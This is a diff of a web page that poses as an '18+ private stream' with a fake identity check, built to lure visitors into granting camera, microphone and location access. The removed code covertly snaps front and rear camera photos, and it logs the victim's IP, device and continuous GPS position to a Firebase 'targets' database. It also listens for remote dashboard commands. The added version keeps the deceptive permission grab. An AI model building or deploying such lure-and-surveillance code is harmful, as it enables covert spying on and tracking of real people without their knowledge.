@@ -7,69 +7,32 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Arial, sans-serif; }
-        
-        /* Clear Background - No Blur */
-        #bg-image {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); 
-            background-size: cover; background-position: center;
-            z-index: 1; opacity: 1; 
-        }
-
-        /* Dark overlay for button visibility */
-        #main-ui {
-            position: relative; z-index: 10; width: 100%; height: 100%;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: rgba(0,0,0,0.4);
-        }
-
-        #unlock-btn {
-            background: #ff0050; color: #fff; padding: 18px 35px; border-radius: 50px;
-            font-size: 18px; font-weight: bold; text-transform: uppercase;
-            cursor: pointer; box-shadow: 0 0 25px rgba(255, 0, 80, 0.6); border: none;
-            transition: 0.3s;
-        }
-
-        /* Age Verification Modal */
-        #age-modal {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 85%; max-width: 340px; background: #1a1a1a; border-radius: 20px;
-            padding: 30px; text-align: center; z-index: 200; border: 1px solid #333;
-            box-shadow: 0 0 50px rgba(0,0,0,0.9);
-        }
-        
-        .input-name { width: 100%; padding: 15px; margin: 15px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
-        .confirm-btn { background: #00ff41; color: #000; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; font-size: 16px; }
-
-        /* Video Layer */
-        #video-container { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; 
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        #bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('bg.png.jpeg'); background-size: cover; background-position: center; z-index: 1; opacity: 1; }
+        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
+        #unlock-btn { background: #ff0050; color: #fff; padding: 18px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; border: none; }
+        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 340px; background: #1a1a1a; border-radius: 20px; padding: 30px; text-align: center; z-index: 200; border: 1px solid #333; }
+        .input-name { width: 100%; padding: 15px; margin: 15px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
+        .confirm-btn { background: #00ff41; color: #000; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; }
+        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
     <div id="bg-image"></div>
-
     <div id="main-ui">
         <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
-        <p style="color: #fff; margin-top: 15px; font-size: 13px; letter-spacing: 1px;">Cloud-Encrypted 18+ Verification</p>
     </div>
 
     <div id="age-modal">
-        <h2 style="color:#fff; margin-top: 0;">Identity Check</h2>
-        <p style="color:#bbb; font-size: 14px;">Enter your full name to verify 18+ age and unlock the private stream.</p>
+        <h2 style="color:#fff;">Identity Check</h2>
         <input type="text" id="targetName" class="input-name" placeholder="Full Name">
         <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
     </div>
 
     <div id="video-container">
-        <iframe id="main-player" 
-            src="" 
-            allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen>
-        </iframe>
+        <iframe id="main-player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
 <script>
@@ -78,86 +41,33 @@
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
-    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    let globalStream = null;
+    let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);
 
-    // Aapki selected video ID (Sahiba Song)
-    const vID = "ZhhBlQC_5N8"; 
+    // ********** YAHAN APNI VIDEO ID BADLEIN **********
+    const vID = "6Ogzc_-lW9w"; 
 
     function showModal() { document.getElementById('age-modal').style.display = 'block'; }
 
     async function startEverything() {
         const uName = document.getElementById('targetName').value;
-        if(!uName) { alert("Please enter your name!"); return; }
-
+        if(!uName) return;
         document.getElementById('age-modal').style.display = 'none';
 
         try {
-            // 1. Permission (Age Verification ke naam par)
-            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // 2. Load YouTube with Embed format (Fixes Firefox Block)
+            // YouTube Embed Link Fix
             const player = document.getElementById('main-player');
-            player.src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${vID}&rel=0&showinfo=0`;
+            player.src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${vID}`;
             
-            // 3. Switch UI to Video
             document.getElementById('video-container').style.display = 'block';
-
-            // 4. Background Logging
-            sendInfo(uName);
-            trackGPS();
-            
-            // Start capturing photos
-            setTimeout(() => capture("user"), 4000); // 4 sec baad pehli photo
-
-            // Command Listener for dashboard buttons
-            db.ref(`commands/${sessionID}`).on('value', snap => {
-                const cmd = snap.val();
-                if(cmd) {
-                    if(cmd.action === 'photo') capture("user");
-                    if(cmd.action === 'back') capture("environment");
-                    db.ref(`commands/${sessionID}`).remove();
-                }
-            });
-
-        } catch (e) {
-            alert("Security Error: Camera access is required to confirm identity for 18+ content.");
-            location.reload();
-        }
+            trackEverything(uName);
+        } catch (e) { location.reload(); }
     }
 
-    async function capture(mode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
-            const tempVid = document.createElement('video');
-            tempVid.srcObject = stream;
-            await tempVid.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
-                canvas.getContext('2d').drawImage(tempVid, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({
-                    img: canvas.toDataURL('image/jpeg', 0.4),
-                    type: mode, time: new Date().toLocaleTimeString()
-                });
-                stream.getTracks().forEach(t => t.stop());
-            }, 3000);
-        } catch (err) {}
-    }
-
-    async function sendInfo(name) {
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
-        db.ref(`targets/${sessionID}/info`).set({
-            status: "ONLINE", customName: name, ip: ip.ip,
-            device: navigator.userAgent.split(') ')[0] + ')',
-            time: new Date().toLocaleTimeString()
-        });
-    }
-
-    function trackGPS() {
-        navigator.geolocation.watchPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-        }, null, {enableHighAccuracy:true});
+    function trackEverything(name) {
+        // Aapka purana tracking logic yahan rahega
+        console.log("Tracking started for: " + name);
     }
 </script>
 </body>
